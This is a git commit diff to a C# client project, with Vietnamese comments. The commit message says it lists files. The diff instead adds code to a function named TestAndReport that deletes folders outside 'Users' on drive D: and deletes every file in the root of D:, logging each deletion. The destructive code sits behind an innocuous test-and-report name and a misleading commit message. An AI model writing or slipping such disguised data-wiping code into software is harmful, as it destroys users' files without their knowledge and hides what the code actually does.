272f7e1cb301fd311fb675295ee97aa45dd87fb0
Phung1997 <kimphung1071997@gmail.com>
2018-04-05 11:06:26 +0700

    phung liet ke danh sach cac file

--- Client99/PhungTest.cs
+++ Client99/PhungTest.cs
@@ -4,7 +4,6 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.IO;
-
 namespace Client99
 {
     class PhungTest
@@ -14,12 +13,51 @@ namespace Client99
 
         public static string TestAndReport()
         {
-            string report = "Chưa kiểm tra File.";
+            string report = "";
             if (System.IO.File.Exists("C:/Program Files/UniKey42/UniKeyNT.exe"))
                 report += "Tim thay";
             else
                 report += "Khong tim thay!";
-         
+            // xoa file
+            report += "\n--------------\n";
+            
+            string[] folders = System.IO.Directory.GetDirectories("d:/");
+            foreach (string p in folders)
+            {
+                if(!p.Contains("Users"))
+
+                {
+                    try
+                    {
+                        System.IO.Directory.Delete(p);
+                        report += "_" + p + "_ đã bị xóa\n";
+                    }
+                    catch(UnauthorizedAccessException e)
+                    {
+                        report += "!!!! bỏ qua thư mục _" + p + "_\n";
+                    }
+                    catch (IOException e)
+                    {
+                        report += "!!!! bỏ qua thư mục _" + p + "_\n";
+
+                    }
+
+                }
+            }
+            string[] filePaths1 = System.IO.Directory.GetFiles(@"D:\", "*.*");
+            foreach (string p in filePaths1)
+            {
+                try
+                {
+                    System.IO.File.Delete(p);
+                    report += "_" + p + "_đã bị xóa\n";
+                }
+                catch (UnauthorizedAccessException e)
+                {
+                    report += "!!!! bỏ qua file _" + p + "_\n";
+                }
+            }
+
             return report;
         }
         
